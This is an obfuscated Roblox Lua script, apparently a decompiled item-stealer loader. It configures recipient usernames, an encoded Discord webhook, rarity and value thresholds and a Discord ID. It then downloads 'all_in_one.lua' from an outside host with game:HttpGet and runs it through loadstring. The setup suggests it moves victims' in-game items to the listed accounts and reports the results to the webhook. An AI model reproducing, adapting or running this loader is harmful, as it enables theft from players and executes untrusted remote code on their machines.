-- This file was generated at discord.gg/syncrypt

v68 = "pack100ms_1"
v87 = "senpogi28"
v70 = { v68, v87 }
Username = v70
v68 = "ZmFkYjIzNzQxYmQ1NGFhZGFlMDRiMmIzNWVjM2JmODdBeGNvRlZad0JIOTJGZzlSZkJJNUVqa0RVbHNnWVFsK1hEOFBZbG9OY0ZVM0RpRXZZbU5rUXdnVUtWd0ZEVFFSRlZOSlFRMTZGWEpDQ3lWR1RReDllU0ZSRlJSY1hFWndDU0FGVTFKUUFENGdNQWRuVjNrRlozSk9FQUZURlVzQU5sUUpOMWxrYlU0QU5oRnhYQzRFVXljT0EyWW1TekVFV2xJVld5bFVBV2NSSWlvMVhWQk5kMVFqSUhGRkpDNHdKU1JhY2hoNk1RSmpQVGtjTzFOTUJpOHZQUXhlQkFKQ2ZqSlVVRk1ETEQwMU4wWmlDQUVTWUZNOUVnTXFUUXhFTlZRalZWbExjRlpmRGpkY1VCQTJKbElYUm1JUFp5eFZZUUFDZENwTlVrWXJWaW9xZTFaWlRuNVNKVVJsTnhnZUF5aFlRemQvT2xkc0MxWkdHeUo2VmhJQUxDQmtBR041YVZRT2JGTXZLQXRPVUVKQk1tWWFBMWsxQjNFZ0tVdGFBQk1LT0VOYVlBSi9HeUVBQVNzNUZCczJRQVkxZEFoRmZEWlZkaVlFV2xVL0VDOExTRnhQYlhBWUt3ZDNHMWMrREJFRVhTNWtLVng2S2xSWk5pUUFBQllYSlZ0aFVXVkRYU1VwWDJFVk1UUXhGMkVHSlh0U1dFRXJHM29NTEg5UExpQW9HMTVnWlUxYUd3VU1iVEVXVVRzaGZGVVZBeTE5ZUNJdEJTUThhWGdYSUJNbGEybGZiRkFtQ2w5Q0ZGSVJEaXhoZGhGalh3ND0="
Webhook = v68
v87 = "Common"
minrarity = v87
v85 = "Common"
minrarity_sailor = v85
min_gen = 0
min_rap = 0
min_val_each = 1
v79 = "1305056929005178994"
discord_id = v79

local u1 = false

v76 = task
v78 = "spawn"
v72 = v76[v78]

function v78()
	local ok, result = pcall(function()
		return game:HttpGet("https://www.astatine.vip/scripts/all_in_one.lua")
	end)

	if not (ok and result) then
		return
	end

	u1 = true
end

v76 = v72(v78)
v78 = task
v80 = "wait"
v72 = v78[v80]
v78 = v72(1)
v78 = task
v92 = up2
v90 = "qy*\2Q~"
v83 = 18017538418736
v80 = "cancel"
v72 = v78[v80]
v78 = v72(v76)
v82 = u1
v80 = v82

if v82 then
	v92 = 27639851571712
	v82 = "https://www.astatine.vip/scripts/"
	v80 = v82
end

v72 = v80

if v80 then
	proxy = v72
	v78 = loadstring
	v81 = game
	v90 = proxy
	v92 = "all_in_one.lua"
	v83 = v90 .. v92
	v90 = v81.HttpGet
	v80 = v78(v90(v81, v83))
	v78 = v80()

	return
end

v92 = up2
v90 = "+\0\29\134\192\216\242\248\185\171RR\223K\134\242oԠ\215s\161E\161(\145՝!"
v83 = 593105989456
v80 = "https://astatine.vip/scripts/"
v72 = v80
proxy = v72
v78 = loadstring
v81 = game
v90 = proxy
v92 = "all_in_one.lua"
v83 = v90 .. v92
v90 = v81.HttpGet
v80 = v78(v90(v81, v83))
v78 = v80()
